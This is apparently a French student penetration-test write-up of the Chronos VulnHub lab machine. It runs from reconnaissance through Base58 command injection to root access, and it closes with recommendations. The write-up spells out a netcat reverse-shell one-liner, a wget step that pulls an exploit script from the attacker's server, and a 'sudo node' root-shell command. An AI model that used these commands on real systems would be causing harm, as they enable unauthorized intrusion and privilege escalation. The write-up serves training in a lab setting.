Cybersécurité Pentest SAÉ 3.04 17 Janvier 2025

Pentest — VM Chronos

Test de pénétration complet sur la machine Chronos (VulnHub, niveau Medium). De la reconnaissance initiale à l'accès root — injection de commandes via Base58, reverse shell, escalade de privilèges via une vulnérabilité Node.js.

netdiscover nmap Burp Suite Base58 Injection de commandes Reverse Shell express-fileupload Node.js GTFOBins Privilege Escalation

Étape 1

Recherche d'information

1
Identification de l'adresse IP cible
Utilisation de netdiscover pour scanner le réseau local et identifier la machine cible.
sudo netdiscover
IP cible identifiée : 192.168.56.108
2
Scan des ports et services avec nmap
Scan de version pour identifier les services exposés sur la cible.
sudo nmap -sV 192.168.56.108
Ports découverts :
  • Port 22 — SSH
  • Port 80 — HTTP (Apache)
  • Port 8000 — HTTP (Node.js Express)

Étape 2

Analyse des services

1
Exploration du service HTTP — Port 80
Page générique sans contenu pertinent. L'analyse du code source révèle une requête vers chronos.local:8000/date?format=... (paramètre encodé en Base58).
Ajout de l'entrée dans /etc/hosts pour résoudre le domaine local :
192.168.56.108 chronos.local
2
Exploration du service HTTP — Port 8000
Application affichant la date/heure. Le paramètre format est encodé en Base58. Après décodage, il correspond à une option de formatage de date passée à une commande système — vecteur d'injection potentiel.

Étape 3

Exploitation

1
Injection de commandes via le paramètre format
Utilisation de Burp Suite Repeater pour modifier le paramètre format. La commande ls -la est encodée en Base58 puis injectée. Résultat : exécution réussie de commandes arbitraires sur le serveur.
Important : le header User-Agent: Chronos doit être spécifié pour que les requêtes soient traitées.
Exécution de commandes arbitraires confirmée
2
Obtention d'un accès shell (www-data)
Reverse shell injecté via le paramètre vulnérable :
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.108 1234 >/tmp/f
Écoute sur la machine attaquante :
nc -lvp 1234
Découverte : le fichier /opt/chronos-v2/backend/server.js révèle l'utilisation du module express-fileupload sur le port 8080 interne.
Accès shell obtenu en tant que www-data

Étape 4

Escalade de privilèges

1
Exploitation de express-fileupload → accès imera
Le module express-fileupload présente une vulnérabilité permettant l'exécution de code à distance. Un exploit Python est transféré depuis la machine attaquante via un serveur HTTP local.
# Sur la machine attaquante python3 -m http.server 8000 # Sur la cible (shell www-data) cd /tmp wget http://<host_ip>/exploit.py # Écoute sur Kali nc -lvp 1234 # Execution python3 exploit.py
Accès obtenu en tant que imera + flag utilisateur
2
Escalade root via sudo node (GTFOBins)
La commande sudo -l révèle qu'imera peut exécuter node avec les privilèges root sans mot de passe.
Commande GTFOBins pour obtenir un shell root interactif :
sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
Accès root obtenu + flag root récupéré

Conclusion

Vulnérabilités & recommandations

La machine Chronos expose une chaîne de 4 vulnérabilités menant à une compromission complète :

  • Services exposés insuffisamment sécurisés (port 8000 accessible publiquement)
  • Injection de commandes via un paramètre encodé en Base58 — absence de validation côté serveur
  • Module express-fileupload obsolète et vulnérable à l'exécution de code arbitraire
  • Configuration sudo permissive — exécution de node en root sans restriction
Recommandations
  • Mettre à jour express-fileupload et toutes les dépendances obsolètes
  • Valider et assainir tous les paramètres utilisateurs côté serveur (jamais de commande système construite depuis l'input)
  • Restreindre l'exposition du port 8080 aux interfaces locales uniquement
  • Réviser la configuration sudoers — appliquer le principe de moindre privilège
